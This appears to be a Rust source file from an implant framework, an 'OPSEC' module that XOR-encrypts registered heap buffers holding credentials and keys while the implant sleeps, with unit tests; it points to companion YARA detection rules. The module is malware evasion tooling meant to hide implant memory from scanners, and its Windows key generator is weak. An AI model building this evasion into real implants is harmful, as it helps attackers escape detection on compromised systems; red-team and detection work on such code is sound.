//! Heap encryption — Phase 4 OPSEC
//!
//! SecureHeap tracks sensitive heap allocations and encrypts them during sleep.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar
//!
//! This protects sensitive data (credentials, keys, etc.) from memory scanners
//! when the implant is sleeping.

#![cfg_attr(not(windows), allow(dead_code))]

use std::sync::Mutex;

/// A tracked heap allocation
#[derive(Debug)]
struct HeapAllocation {
    ptr: *mut u8,
    size: usize,
    encrypted: bool,
}

// SAFETY: HeapAllocation contains raw pointers but is only accessed
// through SecureHeap which uses proper synchronization
unsafe impl Send for HeapAllocation {}

/// SecureHeap manages encryption of sensitive heap allocations
///
/// Register sensitive allocations with `register()`, then call
/// `encrypt_all()` before sleeping and `decrypt_all()` after waking.
pub struct SecureHeap {
    allocations: Mutex<Vec<HeapAllocation>>,
    key: [u8; 32],
}

impl SecureHeap {
    /// Create a new SecureHeap with a random encryption key
    pub fn new() -> Self {
        Self {
            allocations: Mutex::new(Vec::new()),
            key: generate_random_key(),
        }
    }

    /// Create a SecureHeap with a specific key (for testing)
    pub fn with_key(key: [u8; 32]) -> Self {
        Self {
            allocations: Mutex::new(Vec::new()),
            key,
        }
    }

    /// Register a heap allocation for encryption during sleep
    ///
    /// # Safety
    /// - `ptr` must be a valid pointer to `size` bytes of allocated memory
    /// - The memory must remain valid until `unregister()` is called
    /// - Caller must not access the memory while it's encrypted
    pub unsafe fn register(&self, ptr: *mut u8, size: usize) {
        if ptr.is_null() || size == 0 {
            return;
        }

        let mut allocations = self.allocations.lock().unwrap();

        // Check for duplicate registration
        if allocations.iter().any(|a| a.ptr == ptr) {
            return;
        }

        allocations.push(HeapAllocation {
            ptr,
            size,
            encrypted: false,
        });
    }

    /// Unregister a heap allocation
    ///
    /// Call this before freeing memory that was registered.
    pub fn unregister(&self, ptr: *mut u8) {
        let mut allocations = self.allocations.lock().unwrap();
        allocations.retain(|a| a.ptr != ptr);
    }

    /// Encrypt all registered allocations
    ///
    /// Call this before sleeping. Memory will be XOR-encrypted with the key.
    ///
    /// # Safety
    /// - All registered pointers must still be valid
    /// - Caller must not access encrypted memory until `decrypt_all()` is called
    pub unsafe fn encrypt_all(&self) {
        let mut allocations = self.allocations.lock().unwrap();

        for alloc in allocations.iter_mut() {
            if !alloc.encrypted {
                xor_memory(alloc.ptr, alloc.size, &self.key);
                alloc.encrypted = true;
            }
        }
    }

    /// Decrypt all registered allocations
    ///
    /// Call this after waking from sleep.
    ///
    /// # Safety
    /// - All registered pointers must still be valid
    pub unsafe fn decrypt_all(&self) {
        let mut allocations = self.allocations.lock().unwrap();

        for alloc in allocations.iter_mut() {
            if alloc.encrypted {
                xor_memory(alloc.ptr, alloc.size, &self.key);
                alloc.encrypted = false;
            }
        }
    }

    /// Rotate the encryption key
    ///
    /// This decrypts with the old key, generates a new key, and re-encrypts.
    /// Call periodically to limit key exposure.
    ///
    /// # Safety
    /// - All registered pointers must still be valid
    pub unsafe fn rotate_key(&mut self) {
        // Decrypt with old key
        self.decrypt_all();

        // Generate new key
        self.key = generate_random_key();

        // Re-encrypt with new key
        self.encrypt_all();
    }

    /// Get the number of registered allocations
    pub fn allocation_count(&self) -> usize {
        self.allocations.lock().unwrap().len()
    }

    /// Check if any allocations are currently encrypted
    pub fn is_encrypted(&self) -> bool {
        self.allocations
            .lock()
            .unwrap()
            .iter()
            .any(|a| a.encrypted)
    }

    /// Clear all registrations (without decrypting)
    ///
    /// Use with caution - only call when you know the memory is no longer valid.
    pub fn clear(&self) {
        self.allocations.lock().unwrap().clear();
    }
}

impl Default for SecureHeap {
    fn default() -> Self {
        Self::new()
    }
}

/// XOR memory region with key
///
/// # Safety
/// - `base` must be a valid pointer to at least `size` bytes
unsafe fn xor_memory(base: *mut u8, size: usize, key: &[u8; 32]) {
    for i in 0..size {
        let byte = base.add(i);
        *byte ^= key[i % 32];
    }
}

/// Generate a random 32-byte key
fn generate_random_key() -> [u8; 32] {
    let mut key = [0u8; 32];

    #[cfg(target_os = "windows")]
    {
        // Use stack address as entropy source (ASLR provides randomness)
        let stack_addr = &key as *const _ as u64;
        let mut state = stack_addr;
        for byte in key.iter_mut() {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            *byte = (state >> 33) as u8;
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        use rand::RngCore;
        rand::thread_rng().fill_bytes(&mut key);
    }

    key
}

// Global SecureHeap instance for convenience
lazy_static::lazy_static! {
    /// Global SecureHeap instance
    ///
    /// Use this for simple cases. For more control, create your own SecureHeap.
    pub static ref SECURE_HEAP: SecureHeap = SecureHeap::new();
}

/// Register memory with the global SecureHeap
///
/// # Safety
/// See `SecureHeap::register`
#[cfg(windows)]
pub unsafe fn register_sensitive(ptr: *mut u8, size: usize) {
    SECURE_HEAP.register(ptr, size);
}

/// Unregister memory from the global SecureHeap
#[cfg(windows)]
pub fn unregister_sensitive(ptr: *mut u8) {
    SECURE_HEAP.unregister(ptr);
}

/// Encrypt all memory in the global SecureHeap
///
/// # Safety
/// See `SecureHeap::encrypt_all`
#[cfg(windows)]
pub unsafe fn encrypt_sensitive() {
    SECURE_HEAP.encrypt_all();
}

/// Decrypt all memory in the global SecureHeap
///
/// # Safety
/// See `SecureHeap::decrypt_all`
#[cfg(windows)]
pub unsafe fn decrypt_sensitive() {
    SECURE_HEAP.decrypt_all();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_secure_heap_new() {
        let heap = SecureHeap::new();
        assert_eq!(heap.allocation_count(), 0);
        assert!(!heap.is_encrypted());
    }

    #[test]
    fn test_register_unregister() {
        let heap = SecureHeap::new();
        let mut data = vec![1u8, 2, 3, 4, 5];

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(heap.allocation_count(), 1);

        heap.unregister(data.as_mut_ptr());
        assert_eq!(heap.allocation_count(), 0);
    }

    #[test]
    fn test_register_null_ignored() {
        let heap = SecureHeap::new();

        unsafe {
            heap.register(std::ptr::null_mut(), 10);
        }
        assert_eq!(heap.allocation_count(), 0);
    }

    #[test]
    fn test_register_zero_size_ignored() {
        let heap = SecureHeap::new();
        let mut data = vec![1u8];

        unsafe {
            heap.register(data.as_mut_ptr(), 0);
        }
        assert_eq!(heap.allocation_count(), 0);
    }

    #[test]
    fn test_duplicate_registration_ignored() {
        let heap = SecureHeap::new();
        let mut data = vec![1u8, 2, 3, 4, 5];

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());
            heap.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(heap.allocation_count(), 1);
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let key = [0x42u8; 32];
        let heap = SecureHeap::with_key(key);

        let original = vec![0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let mut data = original.clone();

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());

            // Encrypt
            heap.encrypt_all();
            assert!(heap.is_encrypted());
            assert_ne!(data, original, "Data should be encrypted");

            // Decrypt
            heap.decrypt_all();
            assert!(!heap.is_encrypted());
            assert_eq!(data, original, "Data should match original after decrypt");
        }
    }

    #[test]
    fn test_double_encrypt_idempotent() {
        let key = [0x42u8; 32];
        let heap = SecureHeap::with_key(key);

        let original = vec![1u8, 2, 3, 4, 5];
        let mut data = original.clone();

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());

            heap.encrypt_all();
            let encrypted = data.clone();

            // Second encrypt should be no-op
            heap.encrypt_all();
            assert_eq!(data, encrypted, "Double encrypt should be idempotent");
        }
    }

    #[test]
    fn test_double_decrypt_idempotent() {
        let key = [0x42u8; 32];
        let heap = SecureHeap::with_key(key);

        let original = vec![1u8, 2, 3, 4, 5];
        let mut data = original.clone();

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());

            heap.encrypt_all();
            heap.decrypt_all();

            // Second decrypt should be no-op
            heap.decrypt_all();
            assert_eq!(data, original, "Double decrypt should preserve data");
        }
    }

    #[test]
    fn test_multiple_allocations() {
        let key = [0xABu8; 32];
        let heap = SecureHeap::with_key(key);

        let original1 = vec![1u8, 2, 3];
        let original2 = vec![4u8, 5, 6, 7, 8];
        let original3 = vec![9u8, 10];

        let mut data1 = original1.clone();
        let mut data2 = original2.clone();
        let mut data3 = original3.clone();

        unsafe {
            heap.register(data1.as_mut_ptr(), data1.len());
            heap.register(data2.as_mut_ptr(), data2.len());
            heap.register(data3.as_mut_ptr(), data3.len());

            assert_eq!(heap.allocation_count(), 3);

            // Encrypt all
            heap.encrypt_all();
            assert_ne!(data1, original1);
            assert_ne!(data2, original2);
            assert_ne!(data3, original3);

            // Decrypt all
            heap.decrypt_all();
            assert_eq!(data1, original1);
            assert_eq!(data2, original2);
            assert_eq!(data3, original3);
        }
    }

    #[test]
    fn test_clear() {
        let heap = SecureHeap::new();
        let mut data = vec![1u8, 2, 3];

        unsafe {
            heap.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(heap.allocation_count(), 1);

        heap.clear();
        assert_eq!(heap.allocation_count(), 0);
    }

    #[test]
    fn test_xor_memory_roundtrip() {
        let key = [0x55u8; 32];
        let original = vec![0xAAu8, 0xBB, 0xCC, 0xDD];
        let mut data = original.clone();

        unsafe {
            xor_memory(data.as_mut_ptr(), data.len(), &key);
            assert_ne!(data, original);

            xor_memory(data.as_mut_ptr(), data.len(), &key);
            assert_eq!(data, original);
        }
    }

    #[test]
    fn test_generate_random_key_non_zero() {
        let key = generate_random_key();
        // Key should have some non-zero bytes
        assert!(key.iter().any(|&b| b != 0), "Key should not be all zeros");
    }
}
